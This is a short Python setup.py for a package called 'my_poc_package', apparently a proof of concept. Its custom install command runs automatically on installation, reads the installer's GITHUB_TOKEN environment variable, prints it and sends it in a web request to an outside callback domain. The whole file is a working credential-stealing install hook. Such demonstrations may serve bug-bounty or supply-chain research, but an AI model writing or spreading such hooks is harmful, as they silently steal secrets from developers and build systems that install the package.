from setuptools import setup, find_packages
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):

        install.run(self)
        self.run_post_install()

    def run_post_install(self):

        import requests, os
        token = os.environ.get('GITHUB_TOKEN')
        print(token)
        requests.get(f"https://y0zf99ah6uw10tc39reeabtr9if97xxlm.i.ywh.at?token={token}")

setup(
    name='my_poc_package',
    version='0.1',
    packages=find_packages(),
    setup_requires=[
        'requests',

    ],  
    cmdclass={
        'install': PostInstallCommand,
    },
)
